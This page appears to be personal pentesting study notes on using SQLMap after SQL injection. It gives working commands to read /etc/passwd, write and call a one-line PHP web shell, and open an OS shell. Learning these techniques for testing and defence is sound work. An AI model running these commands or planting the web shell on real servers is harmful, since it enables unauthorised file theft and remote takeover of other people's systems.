<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OS Exploitation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>OS Exploitation</h1><br/><br /><strong>Read Files</strong><br />• In MySql, to read local files, the DB user must have the privilege to LOAD DATA and INSERT, to be able to load the content of a file to a table and then reading that table<br />• While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, if we do have DBA privileges, then it is much more probable that we have file-read privileges<h3>.</h3><br />    <div class="codebox"><pre>sqlmap -u &quot;http://www.example.com/?id=1&quot; --is-dba</pre></div><br /><br />To read a specific file in SQLMap:<br /><div class="codebox"><pre>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;</pre></div><br /><br /><br /><strong>Write Files</strong><br />To do that with SQLMap, we can use the --file-write and --file-dest options<br />1. Prepare File to upload<br />    <div class="codebox"><pre>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php</pre></div><br />2. Use SQLMap to upload a WebShell<br />    <div class="codebox"><pre>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</pre></div><br />3. Execute command from the WebShell<br />    <div class="codebox"><pre>curl http://www.example.com/shell.php?cmd=ls+-la</pre></div><br /><br /><br /><strong>Command Execution</strong><br />SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like:<br />• writing a remote shell<br />• writing SQL functions that execute commands and retrieve output<br />• using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server<br />To get an OS shell with SQLMap, we can use the --os-shell option, as follows:<br /><div class="codebox"><pre>sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell</pre></div><br />    <a href=""><img src="images/2550-1.png" alt="images/2550-1.png" /></a><br />    <a href=""><img src="images/2550-2.png" alt="images/2550-2.png" /></a></div>
</body>
</html>
